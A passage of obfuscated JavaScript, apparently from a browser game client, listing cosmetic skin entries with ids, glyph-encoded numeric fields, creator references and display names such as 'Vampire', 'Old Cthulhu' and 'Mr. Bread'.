					"ΔᐃⲆⲆ": ⲆΔ.ⵠΔⲆⵠⵠᐃᐃ,
					"ᐃⵠΔᐃ": ⲆΔ.ⵠΔⲆΔΔᐃⵠ,
					"ⲆΔᐃ": ⵠⵠⵠ.ⵠⲆⲆᐃ,
					"ᐃΔⵠ": ⵠ[183],
					name: "Seams"
				}, {
					id: 104,
					"ᐃΔⲆ": ⲆΔ.ΔⲆᐃΔᐃᐃᐃ,
					"ΔΔᐃ": ⲆΔ.ΔⲆⵠⵠΔᐃⵠ,
					"ΔᐃⲆⲆ": ⲆΔ.Ⲇᐃⵠᐃⵠᐃᐃ,
					"ᐃⵠΔᐃ": ⲆΔ.ᐃΔⵠⲆⲆⵠⲆ,
					"ⲆΔᐃ": ⵠⵠⵠ.ᐃᐃΔⲆ,
					"ᐃΔⵠ": ⵠ[145],
					name: "Scared at night"
				}, {
					id: ⵠΔΔⲆᐃ,
					"ᐃΔⲆ": ⲆΔ.ᐃⲆᐃⲆΔΔⵠ,
					"ΔΔᐃ": ⲆΔ.ⵠΔᐃⵠⲆᐃⲆ,
					"ΔᐃⲆⲆ": ⲆΔ.ΔΔⵠΔΔᐃⵠ,
					"ᐃⵠΔᐃ": ⲆΔ.ⵠΔⵠᐃⵠⵠΔ,
					"ⲆΔᐃ": ⵠⵠⵠ.ᐃᐃΔⲆ,
					"ᐃΔⵠ": ⵠ[183],
					name: "Vampire"
				}, {
					id: 21,
					"ᐃΔⲆ": ⲆΔ.ᐃᐃᐃⵠⲆΔΔ,
					"ΔΔᐃ": ⲆΔ.ⲆᐃⲆΔⵠⵠΔ,
					"ΔᐃⲆⲆ": ⲆΔ.ⵠᐃᐃᐃⵠⵠΔ,
					"ᐃⵠΔᐃ": ⲆΔ.ⲆⲆᐃⵠᐃΔᐃ,
					"ⲆΔᐃ": ⵠⵠⵠ.ᐃᐃΔⲆ,
					"ᐃΔⵠ": ⵠ[183],
					name: "Zombie"
				}, {
					id: 22,
					"ᐃΔⲆ": ⲆΔ.ⲆⵠΔΔⲆⵠⵠ,
					"ΔΔᐃ": ⲆΔ.ᐃⲆⲆᐃⵠΔᐃ,
					"ΔᐃⲆⲆ": ⲆΔ.ⵠΔᐃⲆⵠΔⵠ,
					"ᐃⵠΔᐃ": ⲆΔ.ⲆΔⵠⲆᐃⵠΔ,
					"ⲆΔᐃ": ⵠⵠⵠ.ᐃᐃΔⲆ,
					"ᐃΔⵠ": ⵠ[362],
					name: "Devaster"
				}, {
					id: 116,
					"ᐃΔⲆ": ⲆΔ.ⵠⵠⵠΔⵠⵠΔ,
					"ΔΔᐃ": ⲆΔ.ᐃᐃΔⵠⲆΔΔ,
					"ΔᐃⲆⲆ": ⲆΔ.ⲆΔⲆⲆΔⵠᐃ,
					"ᐃⵠΔᐃ": ⲆΔ.ⵠⵠⲆᐃΔⲆⵠ,
					"ⲆΔᐃ": ⵠⵠⵠ.ᐃᐃΔⲆ,
					"ᐃΔⵠ": "Fukss",
					name: "Dead Devaster"
				}, {
					id: 27,
					"ᐃΔⲆ": ⲆΔ.ΔᐃⵠΔⵠⲆΔ,
					"ΔΔᐃ": ⲆΔ.ΔΔᐃⲆᐃᐃⲆ,
					"ΔᐃⲆⲆ": ⲆΔ.ΔⲆΔᐃᐃᐃⵠ,
					"ᐃⵠΔᐃ": ⲆΔ.ⲆⲆᐃΔⲆⲆⵠ,
					"ⲆΔᐃ": ⵠⵠⵠ.ᐃᐃΔⲆ,
					"ᐃΔⵠ": ⵠ[36],
					name: ⵠ[15]
				}, {
					id: 28,
					"ᐃΔⲆ": ⲆΔ.ΔᐃⲆΔⵠⲆᐃ,
					"ΔΔᐃ": ⲆΔ.ⵠΔΔΔⲆⵠⲆ,
					"ΔᐃⲆⲆ": ⲆΔ.ΔⵠᐃⵠΔᐃΔ,
					"ᐃⵠΔᐃ": ⲆΔ.ᐃⵠΔⲆᐃⲆᐃ,
					"ⲆΔᐃ": ⵠⵠⵠ.ᐃᐃΔⲆ,
					"ᐃΔⵠ": ⵠ[145],
					name: "Bee"
				}, {
					id: 49,
					"ᐃΔⲆ": ⲆΔ.ⵠᐃⲆᐃᐃⲆⲆ,
					"ΔΔᐃ": ⲆΔ.ᐃⲆΔΔΔⵠᐃ,
					"ΔᐃⲆⲆ": ⲆΔ.ᐃᐃⲆΔᐃᐃᐃ,
					"ᐃⵠΔᐃ": ⲆΔ.ΔⲆΔⲆᐃΔⵠ,
					"ⲆΔᐃ": ⵠⵠⵠ.ᐃᐃΔⲆ,
					"ᐃΔⵠ": ⵠ[78],
					name: "Camo Skin"
				}, {
					id: 58,
					"ᐃΔⲆ": ⲆΔ.ⲆΔΔΔⲆΔⵠ,
					"ΔΔᐃ": ⲆΔ.ᐃΔⲆᐃΔⲆⵠ,
					"ΔᐃⲆⲆ": ⲆΔ.ⲆᐃⵠⲆΔⵠⵠ,
					"ᐃⵠΔᐃ": ⲆΔ.ΔᐃⵠΔⲆᐃΔ,
					"ⲆΔᐃ": ⵠⵠⵠ.ᐃᐃΔⲆ,
					"ᐃΔⵠ": ⵠ[183],
					name: "Blue Limax Skin"
				}, {
					id: 59,
					"ᐃΔⲆ": ⲆΔ.ΔᐃΔΔⲆᐃᐃ,
					"ΔΔᐃ": ⲆΔ.ΔᐃᐃᐃᐃᐃΔ,
					"ΔᐃⲆⲆ": ⲆΔ.ᐃⵠΔⲆᐃΔⲆ,
					"ᐃⵠΔᐃ": ⲆΔ.ᐃⲆⵠΔⵠⵠΔ,
					"ⲆΔᐃ": ⵠⵠⵠ.ᐃᐃΔⲆ,
					"ᐃΔⵠ": ⵠ[183],
					name: "Red Limax Skin"
				}, {
					id: 94,
					"ᐃΔⲆ": ⲆΔ.ᐃΔⵠⵠΔⲆΔ,
					"ΔΔᐃ": ⲆΔ.ᐃⵠⵠΔⵠᐃⲆ,
					"ΔᐃⲆⲆ": ⲆΔ.ᐃⲆⲆⵠᐃⵠⵠ,
					"ᐃⵠΔᐃ": ⲆΔ.ᐃⵠᐃⵠⲆΔΔ,
					"ⲆΔᐃ": ⵠⵠⵠ.ᐃᐃΔⲆ,
					"ᐃΔⵠ": ⵠ[78],
					name: "Mr. Pumpkin"
				}, {
					id: 109,
					"ᐃΔⲆ": ⲆΔ.ΔⲆΔⲆⵠⲆⲆ,
					"ΔΔᐃ": ⲆΔ.ᐃᐃᐃΔᐃⵠⲆ,
					"ΔᐃⲆⲆ": ⲆΔ.ⵠᐃⵠΔⵠᐃᐃ,
					"ᐃⵠΔᐃ": ⲆΔ.ᐃΔⵠΔⲆⵠᐃ,
					"ⲆΔᐃ": ⵠⵠⵠ.ᐃᐃΔⲆ,
					"ᐃΔⵠ": ⵠ[145],
					name: "Wood"
				}, {
					id: 114,
					"ᐃΔⲆ": ⲆΔ.ΔⲆᐃᐃᐃⵠΔ,
					"ΔΔᐃ": ⲆΔ.ᐃᐃΔΔᐃⲆᐃ,
					"ΔᐃⲆⲆ": ⲆΔ.ΔᐃᐃΔᐃⲆᐃ,
					"ᐃⵠΔᐃ": ⲆΔ.ⲆΔⲆΔᐃⲆᐃ,
					"ⲆΔᐃ": ⵠⵠⵠ.ᐃᐃΔⲆ,
					"ᐃΔⵠ": ⵠ[145],
					name: "Zebra"
				}, {
					id: 120,
					"ᐃΔⲆ": ⲆΔ.ᐃⲆΔⲆⵠⵠΔ,
					"ΔΔᐃ": ⲆΔ.ΔᐃᐃᐃⵠⵠΔ,
					"ΔᐃⲆⲆ": ⲆΔ.ⵠΔᐃⵠΔⲆΔ,
					"ᐃⵠΔᐃ": ⲆΔ.ⵠⵠⲆⲆⲆⲆᐃ,
					"ⲆΔᐃ": ⵠⵠⵠ.ᐃᐃΔⲆ,
					"ᐃΔⵠ": ⵠ[373],
					name: "Tiger"
				}, {
					id: 134,
					"ᐃΔⲆ": ⲆΔ.ᐃⲆΔⲆⲆⲆⵠ,
					"ΔΔᐃ": ⲆΔ.ⵠⲆΔⲆᐃΔᐃ,
					"ΔᐃⲆⲆ": ⲆΔ.Ⲇⵠⵠⵠⵠᐃⵠ,
					"ᐃⵠΔᐃ": ⲆΔ.ᐃᐃᐃᐃⵠΔⵠ,
					"ⲆΔᐃ": ⵠⵠⵠ.ᐃᐃΔⲆ,
					"ᐃΔⵠ": "Franchestcreator",
					name: "Day or Night"
				}, {
					id: 135,
					"ᐃΔⲆ": ⲆΔ.ΔⵠΔⵠᐃⵠⲆ,
					"ΔΔᐃ": ⲆΔ.ⵠⵠⵠⵠⲆⲆⲆ,
					"ΔᐃⲆⲆ": ⲆΔ.ᐃⵠᐃⵠⵠᐃᐃ,
					"ᐃⵠΔᐃ": ⲆΔ.ⵠⵠⵠⵠᐃᐃᐃ,
					"ⲆΔᐃ": ⵠⵠⵠ.ᐃᐃΔⲆ,
					"ᐃΔⵠ": "Poinet",
					name: "Square Starver"
				}, {
					id: 136,
					"ᐃΔⲆ": ⲆΔ.ⲆⲆΔΔᐃⲆⲆ,
					"ΔΔᐃ": ⲆΔ.ΔᐃᐃΔᐃΔΔ,
					"ΔᐃⲆⲆ": ⲆΔ.ΔⲆΔᐃΔⵠⵠ,
					"ᐃⵠΔᐃ": ⲆΔ.ⵠᐃⵠΔⲆΔΔ,
					"ⲆΔᐃ": ⵠⵠⵠ.ᐃᐃΔⲆ,
					"ᐃΔⵠ": ⵠ[183],
					name: "Voodoo Doll"
				}, {
					id: 137,
					"ᐃΔⲆ": ⲆΔ.ΔⵠⵠⲆΔᐃⲆ,
					"ΔΔᐃ": ⲆΔ.ΔᐃᐃⵠᐃᐃΔ,
					"ΔᐃⲆⲆ": ⲆΔ.ΔⲆⲆΔΔΔⲆ,
					"ᐃⵠΔᐃ": ⲆΔ.ΔΔΔⲆⲆΔⵠ,
					"ⲆΔᐃ": ⵠⵠⵠ.ᐃᐃΔⲆ,
					"ᐃΔⵠ": ⵠ[183],
					name: "Frankenstein"
				}, {
					id: 138,
					"ᐃΔⲆ": ⲆΔ.ᐃΔⵠⵠⲆⲆⲆ,
					"ΔΔᐃ": ⲆΔ.ΔⵠⲆΔΔⲆⲆ,
					"ΔᐃⲆⲆ": ⲆΔ.ⵠⲆΔᐃⲆΔᐃ,
					"ᐃⵠΔᐃ": ⲆΔ.ⵠᐃᐃⲆⵠⲆⵠ,
					"ⲆΔᐃ": ⵠⵠⵠ.ᐃᐃΔⲆ,
					"ᐃΔⵠ": ⵠ[183],
					name: "Old Mummy"
				}, {
					id: 139,
					"ᐃΔⲆ": ⲆΔ.ⵠᐃΔⵠᐃⲆⲆ,
					"ΔΔᐃ": ⲆΔ.ᐃΔⲆⵠΔⲆΔ,
					"ΔᐃⲆⲆ": ⲆΔ.ΔⵠᐃᐃᐃⲆⵠ,
					"ᐃⵠΔᐃ": ⲆΔ.ΔⵠⵠⵠⲆΔⵠ,
					"ⲆΔᐃ": ⵠⵠⵠ.ᐃᐃΔⲆ,
					"ᐃΔⵠ": ⵠ[183],
					name: "Werewolf"
				}, {
					id: 140,
					"ᐃΔⲆ": ⲆΔ.ⲆᐃᐃΔⲆⵠΔ,
					"ΔΔᐃ": ⲆΔ.ⵠΔΔⵠⵠⲆⵠ,
					"ΔᐃⲆⲆ": ⲆΔ.ⲆⲆᐃΔᐃᐃⲆ,
					"ᐃⵠΔᐃ": ⲆΔ.ⲆΔΔΔΔΔᐃ,
					"ⲆΔᐃ": ⵠⵠⵠ.ᐃᐃΔⲆ,
					"ᐃΔⵠ": ⵠ[183],
					name: "Old Cthulhu"
				}, {
					id: 141,
					"ᐃΔⲆ": ⲆΔ.ΔⵠᐃⵠΔⲆⵠ,
					"ΔΔᐃ": ⲆΔ.ᐃΔⲆΔᐃΔⲆ,
					"ΔᐃⲆⲆ": ⲆΔ.ΔᐃΔᐃᐃᐃⲆ,
					"ᐃⵠΔᐃ": ⲆΔ.ⵠᐃⵠⲆᐃᐃΔ,
					"ⲆΔᐃ": ⵠⵠⵠ.ᐃᐃΔⲆ,
					"ᐃΔⵠ": ⵠ[183],
					name: "Sea Man"
				}, {
					id: 142,
					"ᐃΔⲆ": ⲆΔ.ⲆⲆⲆΔⲆΔⵠ,
					"ΔΔᐃ": ⲆΔ.ⲆⵠᐃⵠⲆⲆᐃ,
					"ΔᐃⲆⲆ": ⲆΔ.ΔΔᐃⲆⵠⲆΔ,
					"ᐃⵠΔᐃ": ⲆΔ.ⵠⵠⲆⲆᐃⵠᐃ,
					"ⲆΔᐃ": ⵠⵠⵠ.ᐃᐃΔⲆ,
					"ᐃΔⵠ": ⵠ[183],
					name: "Old Pumpkin"
				}, {
					id: 148,
					"ᐃΔⲆ": ⲆΔ.ⵠⵠⲆⵠⲆΔⲆ,
					"ΔΔᐃ": ⲆΔ.ΔᐃⵠᐃᐃⲆᐃ,
					"ΔᐃⲆⲆ": ⲆΔ.ⲆΔⲆⵠᐃΔⲆ,
					"ᐃⵠΔᐃ": ⲆΔ.ⲆⵠⵠΔⲆⵠⲆ,
					"ⲆΔᐃ": ⵠⵠⵠ.ᐃᐃΔⲆ,
					"ᐃΔⵠ": ⵠ[183],
					name: "Old Snowman"
				}, {
					id: 149,
					"ᐃΔⲆ": ⲆΔ.ⲆⲆⲆⲆᐃⲆΔ,
					"ΔΔᐃ": ⲆΔ.ⲆΔᐃⵠᐃⵠᐃ,
					"ΔᐃⲆⲆ": ⲆΔ.ⵠⵠⲆΔᐃⵠⲆ,
					"ᐃⵠΔᐃ": ⲆΔ.ΔΔΔΔⵠⲆⵠ,
					"ⲆΔᐃ": ⵠⵠⵠ.ᐃᐃΔⲆ,
					"ᐃΔⵠ": ⵠ[183],
					name: "Old Christmas Tree Man"
				}, {
					id: 150,
					"ᐃΔⲆ": ⲆΔ.ⵠⲆᐃⲆΔᐃⵠ,
					"ΔΔᐃ": ⲆΔ.ⲆⲆΔⲆⲆⵠⵠ,
					"ΔᐃⲆⲆ": ⲆΔ.ⲆᐃᐃⲆⵠⵠΔ,
					"ᐃⵠΔᐃ": ⲆΔ.ᐃⵠΔⵠᐃⵠⲆ,
					"ⲆΔᐃ": ⵠⵠⵠ.ᐃᐃΔⲆ,
					"ᐃΔⵠ": ⵠ[183],
					name: "Old Mrs Bell"
				}, {
					id: 151,
					"ᐃΔⲆ": ⲆΔ.ⵠᐃⲆⲆΔⵠⲆ,
					"ΔΔᐃ": ⲆΔ.ΔᐃⲆᐃΔΔᐃ,
					"ΔᐃⲆⲆ": ⲆΔ.ⵠΔⲆᐃΔⵠⵠ,
					"ᐃⵠΔᐃ": ⲆΔ.ⵠΔⵠⲆⵠⲆⵠ,
					"ⲆΔᐃ": ⵠⵠⵠ.ᐃᐃΔⲆ,
					"ᐃΔⵠ": ⵠ[183],
					name: "Old Elfy"
				}, {
					id: 152,
					"ᐃΔⲆ": ⲆΔ.ΔᐃΔⲆΔⵠᐃ,
					"ΔΔᐃ": ⲆΔ.ⵠΔΔⵠⲆᐃΔ,
					"ΔᐃⲆⲆ": ⲆΔ.ᐃᐃᐃΔᐃᐃⲆ,
					"ᐃⵠΔᐃ": ⲆΔ.ΔⵠⲆⲆΔᐃᐃ,
					"ⲆΔᐃ": ⵠⵠⵠ.ᐃᐃΔⲆ,
					"ᐃΔⵠ": ⵠ[183],
					name: "Old Mr Present"
				}, {
					id: 153,
					"ᐃΔⲆ": ⲆΔ.ΔⵠΔᐃⵠⵠΔ,
					"ΔΔᐃ": ⲆΔ.ΔⵠⲆⵠⲆⵠΔ,
					"ΔᐃⲆⲆ": ⲆΔ.ⲆⲆⲆⲆⲆⵠΔ,
					"ᐃⵠΔᐃ": ⲆΔ.ΔΔⲆᐃⵠⲆᐃ,
					"ⲆΔᐃ": ⵠⵠⵠ.ᐃᐃΔⲆ,
					"ᐃΔⵠ": ⵠ[183],
					name: "My Dear Old Deer"
				}, {
					id: 154,
					"ᐃΔⲆ": ⲆΔ.ⵠΔΔΔΔΔΔ,
					"ΔΔᐃ": ⲆΔ.ⲆⵠΔΔΔⵠⵠ,
					"ΔᐃⲆⲆ": ⲆΔ.ΔΔᐃΔΔⵠⲆ,
					"ᐃⵠΔᐃ": ⲆΔ.ⲆⲆᐃⲆᐃⲆⵠ,
					"ⲆΔᐃ": ⵠⵠⵠ.ᐃᐃΔⲆ,
					"ᐃΔⵠ": ⵠ[183],
					name: "Mr Angel"
				}, {
					id: 155,
					"ᐃΔⲆ": ⲆΔ.ΔⲆᐃⵠᐃΔⵠ,
					"ΔΔᐃ": ⲆΔ.ᐃᐃⵠᐃⲆΔΔ,
					"ΔᐃⲆⲆ": ⲆΔ.ΔΔᐃⵠⲆⵠⵠ,
					"ᐃⵠΔᐃ": ⲆΔ.ᐃΔⵠᐃᐃⵠⵠ,
					"ⲆΔᐃ": ⵠⵠⵠ.ᐃᐃΔⲆ,
					"ᐃΔⵠ": ⵠ[183],
					name: "Mr Ice Cube"
				}, {
					id: 156,
					"ᐃΔⲆ": ⲆΔ.ⵠᐃⲆᐃᐃᐃⵠ,
					"ΔΔᐃ": ⲆΔ.ⲆⲆⲆⵠⵠⲆΔ,
					"ΔᐃⲆⲆ": ⲆΔ.ΔⲆⵠⲆⲆⲆⲆ,
					"ᐃⵠΔᐃ": ⲆΔ.ⵠᐃΔᐃΔᐃᐃ,
					"ⲆΔᐃ": ⵠⵠⵠ.ᐃᐃΔⲆ,
					"ᐃΔⵠ": ⵠ[183],
					name: "Mr Snowman"
				}, {
					id: 159,
					"ᐃΔⲆ": ⲆΔ.ⲆΔᐃⲆⲆⵠⲆ,
					"ΔΔᐃ": ⲆΔ.ⵠⲆⵠΔΔⵠⲆ,
					"ΔᐃⲆⲆ": ⲆΔ.ᐃⲆⲆΔⲆᐃᐃ,
					"ᐃⵠΔᐃ": ⲆΔ.ΔⲆⵠᐃⲆⲆⵠ,
					"ⲆΔᐃ": ⵠⵠⵠ.ᐃᐃΔⲆ,
					"ᐃΔⵠ": ⵠ[373],
					name: "Crystal Sky Skin"
				}, {
					id: 167,
					"ᐃΔⲆ": ⲆΔ.ᐃᐃⵠᐃⵠⲆᐃ,
					"ΔΔᐃ": ⲆΔ.ΔΔⵠⲆⵠⲆᐃ,
					"ΔᐃⲆⲆ": ⲆΔ.ⲆᐃΔΔΔΔᐃ,
					"ᐃⵠΔᐃ": ⲆΔ.ΔⲆᐃⵠᐃⲆⲆ,
					"ⲆΔᐃ": ⵠⵠⵠ.ᐃᐃΔⲆ,
					"ᐃΔⵠ": "Franchestcreator",
					name: "Radioactive Starver"
				}, {
					id: 169,
					"ᐃΔⲆ": ⲆΔ.ⲆᐃᐃⵠⲆⵠΔ,
					"ΔΔᐃ": ⲆΔ.ⲆⲆᐃΔᐃΔⲆ,
					"ΔᐃⲆⲆ": ⲆΔ.ΔⵠΔᐃᐃⲆⲆ,
					"ᐃⵠΔᐃ": ⲆΔ.ⵠΔᐃᐃⵠΔⲆ,
					"ⲆΔᐃ": ⵠⵠⵠ.ᐃᐃΔⲆ,
					"ᐃΔⵠ": "TheScaryBlaze",
					name: "Eaten Cookie"
				}, {
					id: 170,
					"ᐃΔⲆ": ⲆΔ.ⵠΔΔΔᐃⲆⲆ,
					"ΔΔᐃ": ⲆΔ.ᐃΔΔᐃΔᐃΔ,
					"ΔᐃⲆⲆ": ⲆΔ.ⲆᐃΔᐃⵠᐃⵠ,
					"ᐃⵠΔᐃ": ⲆΔ.ⲆⲆⲆⲆⲆΔᐃ,
					"ⲆΔᐃ": ⵠⵠⵠ.ᐃᐃΔⲆ,
					"ᐃΔⵠ": ⵠ[427],
					name: "Blob Thing"
				}, {
					id: 172,
					"ᐃΔⲆ": ⲆΔ.ᐃⲆΔᐃᐃⲆΔ,
					"ΔΔᐃ": ⲆΔ.ᐃⲆⵠΔⲆⵠΔ,
					"ΔᐃⲆⲆ": ⲆΔ.ᐃⵠⵠᐃⲆᐃⲆ,
					"ᐃⵠΔᐃ": ⲆΔ.ᐃⲆⲆⲆⵠⵠΔ,
					"ⲆΔᐃ": ⵠⵠⵠ.ᐃᐃΔⲆ,
					"ᐃΔⵠ": ⵠ[427],
					name: "Machine Mask"
				}, {
					id: 184,
					"ᐃΔⲆ": ⲆΔ.ΔᐃᐃⵠⵠⵠΔ,
					"ΔΔᐃ": ⲆΔ.ΔⵠΔΔⲆⲆⲆ,
					"ΔᐃⲆⲆ": ⲆΔ.ⵠⵠΔᐃᐃᐃᐃ,
					"ᐃⵠΔᐃ": ⲆΔ.ΔΔⵠᐃⲆⵠⲆ,
					"ⲆΔᐃ": ⵠⵠⵠ.ᐃᐃΔⲆ,
					"ᐃΔⵠ": ⵠ[183],
					name: "Mad"
				}, {
					id: 206,
					"ᐃΔⲆ": ⲆΔ.ΔⵠᐃᐃᐃᐃⲆ,
					"ΔΔᐃ": ⲆΔ.ⵠⲆⲆΔΔⵠⵠ,
					"ΔᐃⲆⲆ": ⲆΔ.ΔⵠⲆᐃⲆⲆΔ,
					"ᐃⵠΔᐃ": ⲆΔ.ΔᐃⲆⵠⵠᐃⲆ,
					"ⲆΔᐃ": ⵠⵠⵠ.ᐃᐃΔⲆ,
					"ᐃΔⵠ": ⵠ[183],
					name: "Survivor"
				}, {
					id: 209,
					"ᐃΔⲆ": ⲆΔ.ⵠΔⲆⵠᐃⲆᐃ,
					"ΔΔᐃ": ⲆΔ.ΔᐃᐃⵠⵠⲆⲆ,
					"ΔᐃⲆⲆ": ⲆΔ.ᐃΔᐃΔᐃᐃⵠ,
					"ᐃⵠΔᐃ": ⲆΔ.ⲆⲆⵠⲆᐃⲆΔ,
					"ⲆΔᐃ": ⵠⵠⵠ.ᐃᐃΔⲆ,
					"ᐃΔⵠ": ⵠ[183],
					name: "Starverator"
				}, {
					id: 230,
					"ᐃΔⲆ": ⲆΔ.ⵠⵠⲆⵠᐃᐃⲆ,
					"ΔΔᐃ": ⲆΔ.ᐃᐃΔΔᐃⲆⲆ,
					"ΔᐃⲆⲆ": ⲆΔ.ᐃⲆᐃⵠⵠⵠⲆ,
					"ᐃⵠΔᐃ": ⲆΔ.ΔᐃᐃᐃⲆᐃⲆ,
					"ⲆΔᐃ": ⵠⵠⵠ.ᐃᐃΔⲆ,
					"ᐃΔⵠ": ⵠ[183],
					name: ⵠ[534]
				}, {
					id: 231,
					"ᐃΔⲆ": ⲆΔ.ΔⲆΔⲆΔⵠᐃ,
					"ΔΔᐃ": ⲆΔ.ⲆⵠΔⵠⲆΔⵠ,
					"ΔᐃⲆⲆ": ⲆΔ.ΔᐃΔⲆⲆⵠⲆ,
					"ᐃⵠΔᐃ": ⲆΔ.ⵠⵠⵠΔⵠᐃᐃ,
					"ⲆΔᐃ": ⵠⵠⵠ.ᐃᐃΔⲆ,
					"ᐃΔⵠ": ⵠ[183],
					name: "Big Pile of Sand"
				}, {
					id: 232,
					"ᐃΔⲆ": ⲆΔ.ⵠⵠᐃⲆᐃⲆⵠ,
					"ΔΔᐃ": ⲆΔ.ᐃⵠⲆⲆΔΔⵠ,
					"ΔᐃⲆⲆ": ⲆΔ.ᐃΔΔᐃᐃᐃⵠ,
					"ᐃⵠΔᐃ": ⲆΔ.ⵠⲆᐃⲆⵠⵠⲆ,
					"ⲆΔᐃ": ⵠⵠⵠ.ᐃᐃΔⲆ,
					"ᐃΔⵠ": ⵠ[183],
					name: "Big Pile of Dirt"
				}, {
					id: 235,
					"ᐃΔⲆ": ⲆΔ.ⵠⵠⵠᐃΔⵠᐃ,
					"ΔΔᐃ": ⲆΔ.ᐃⵠⵠΔⲆᐃᐃ,
					"ΔᐃⲆⲆ": ⲆΔ.ⵠⲆᐃⲆⵠΔᐃ,
					"ᐃⵠΔᐃ": ⲆΔ.ΔⲆⲆⲆᐃⲆᐃ,
					"ⲆΔᐃ": ⵠⵠⵠ.ᐃᐃΔⲆ,
					"ᐃΔⵠ": ⵠ[183],
					name: "Sandstone"
				}, {
					id: 29,
					"ᐃΔⲆ": ⲆΔ.ⵠⲆⲆⵠⲆΔΔ,
					"ΔΔᐃ": ⲆΔ.ⵠΔᐃⲆⵠⵠΔ,
					"ΔᐃⲆⲆ": ⲆΔ.ⵠⵠⵠⲆⲆⵠⲆ,
					"ᐃⵠΔᐃ": ⲆΔ.ⲆⲆⲆⵠΔⲆΔ,
					"ⲆΔᐃ": ⵠⵠⵠ.ΔⲆⵠⵠ,
					"ᐃΔⵠ": ⵠ[362],
					name: "Lollipop 1"
				}, {
					id: 30,
					"ᐃΔⲆ": ⲆΔ.ᐃⵠⲆΔⵠΔΔ,
					"ΔΔᐃ": ⲆΔ.ᐃⵠᐃⲆⲆᐃⵠ,
					"ΔᐃⲆⲆ": ⲆΔ.ⵠⵠᐃΔⲆⲆᐃ,
					"ᐃⵠΔᐃ": ⲆΔ.ᐃΔΔⲆΔΔΔ,
					"ⲆΔᐃ": ⵠⵠⵠ.ΔⲆⵠⵠ,
					"ᐃΔⵠ": ⵠ[183],
					name: "Lollipop 2"
				}, {
					id: 31,
					"ᐃΔⲆ": ⲆΔ.ⲆⲆⵠⲆⵠΔᐃ,
					"ΔΔᐃ": ⲆΔ.ΔⲆⵠᐃⵠΔⲆ,
					"ΔᐃⲆⲆ": ⲆΔ.ᐃᐃᐃⵠΔΔᐃ,
					"ᐃⵠΔᐃ": ⲆΔ.ΔⵠⵠⲆΔⵠⲆ,
					"ⲆΔᐃ": ⵠⵠⵠ.ΔⲆⵠⵠ,
					"ᐃΔⵠ": ⵠ[183],
					name: "Lollipop 3"
				}, {
					id: 32,
					"ᐃΔⲆ": ⲆΔ.ΔᐃⲆⲆⲆᐃⲆ,
					"ΔΔᐃ": ⲆΔ.ΔᐃᐃᐃΔᐃⵠ,
					"ΔᐃⲆⲆ": ⲆΔ.ΔΔᐃᐃᐃᐃᐃ,
					"ᐃⵠΔᐃ": ⲆΔ.ᐃⵠΔⵠⲆⵠⲆ,
					"ⲆΔᐃ": ⵠⵠⵠ.ΔⲆⵠⵠ,
					"ᐃΔⵠ": ⵠ[183],
					name: "Lollipop 4"
				}, {
					id: 33,
					"ᐃΔⲆ": ⲆΔ.ⲆⵠⵠᐃΔⵠⲆ,
					"ΔΔᐃ": ⲆΔ.ᐃᐃⲆᐃⲆⵠᐃ,
					"ΔᐃⲆⲆ": ⲆΔ.ⲆᐃⲆΔᐃⲆΔ,
					"ᐃⵠΔᐃ": ⲆΔ.ⵠᐃⵠⵠᐃⵠΔ,
					"ⲆΔᐃ": ⵠⵠⵠ.ΔⲆⵠⵠ,
					"ᐃΔⵠ": ⵠ[395],
					name: "Yellow Bird"
				}, {
					id: 34,
					"ᐃΔⲆ": ⲆΔ.ᐃⲆΔⵠᐃΔᐃ,
					"ΔΔᐃ": ⲆΔ.ΔⵠᐃᐃΔⲆᐃ,
					"ΔᐃⲆⲆ": ⲆΔ.ΔΔⲆᐃΔⲆᐃ,
					"ᐃⵠΔᐃ": ⲆΔ.ΔⵠᐃⲆⲆᐃⵠ,
					"ⲆΔᐃ": ⵠⵠⵠ.ΔⲆⵠⵠ,
					"ᐃΔⵠ": ⵠ[395],
					name: "Red Bird"
				}, {
					id: 35,
					"ᐃΔⲆ": ⲆΔ.ΔᐃⵠΔΔⲆΔ,
					"ΔΔᐃ": ⲆΔ.ᐃⲆᐃⵠᐃⵠΔ,
					"ΔᐃⲆⲆ": ⲆΔ.ⲆᐃΔΔᐃⲆⲆ,
					"ᐃⵠΔᐃ": ⲆΔ.ᐃΔⲆⲆΔᐃΔ,
					"ⲆΔᐃ": ⵠⵠⵠ.ΔⲆⵠⵠ,
					"ᐃΔⵠ": ⵠ[395],
					name: "Blue Bird"
				}, {
					id: 37,
					"ᐃΔⲆ": ⲆΔ.ⲆⲆΔⲆᐃⲆΔ,
					"ΔΔᐃ": ⲆΔ.ⲆᐃᐃΔⵠᐃⲆ,
					"ΔᐃⲆⲆ": ⲆΔ.ⲆᐃΔΔⵠⲆΔ,
					"ᐃⵠΔᐃ": ⲆΔ.ᐃⲆΔᐃΔⲆⲆ,
					"ⲆΔᐃ": ⵠⵠⵠ.ΔⲆⵠⵠ,
					"ᐃΔⵠ": ⵠ[36],
					name: "Owl"
				}, {
					id: 52,
					"ᐃΔⲆ": ⲆΔ.ⵠⲆⲆⵠⵠⵠⲆ,
					"ΔΔᐃ": ⲆΔ.ᐃΔΔⲆⵠΔΔ,
					"ΔᐃⲆⲆ": ⲆΔ.ⲆᐃⵠⵠΔⵠᐃ,
					"ᐃⵠΔᐃ": ⲆΔ.ΔᐃⵠⲆΔⵠᐃ,
					"ⲆΔᐃ": ⵠⵠⵠ.ΔⲆⵠⵠ,
					"ᐃΔⵠ": ⵠ[183],
					name: "Nemo"
				}, {
					id: 53,
					"ᐃΔⲆ": ⲆΔ.ⲆⲆΔⵠⲆⵠⵠ,
					"ΔΔᐃ": ⲆΔ.ⵠΔΔᐃΔⲆΔ,
					"ΔᐃⲆⲆ": ⲆΔ.ᐃΔⵠⵠᐃⲆΔ,
					"ᐃⵠΔᐃ": ⲆΔ.ΔΔᐃΔⵠΔΔ,
					"ⲆΔᐃ": ⵠⵠⵠ.ΔⲆⵠⵠ,
					"ᐃΔⵠ": ⵠ[183],
					name: "Mr. Bread"
				}, {
					id: 74,
					"ᐃΔⲆ": ⲆΔ.Ⲇⵠⵠᐃⵠⵠᐃ,
					"ΔΔᐃ": ⲆΔ.ΔᐃⲆⵠᐃᐃᐃ,
					"ΔᐃⲆⲆ": ⲆΔ.ⵠⵠΔⲆᐃᐃΔ,
					"ᐃⵠΔᐃ": ⲆΔ.ⲆⵠᐃΔⲆⵠⲆ,
					"ⲆΔᐃ": ⵠⵠⵠ.ΔⲆⵠⵠ,
					"ᐃΔⵠ": "Communist & Taco4Life",
					name: "Mr. Bread 2"
				}, {
					id: 75,
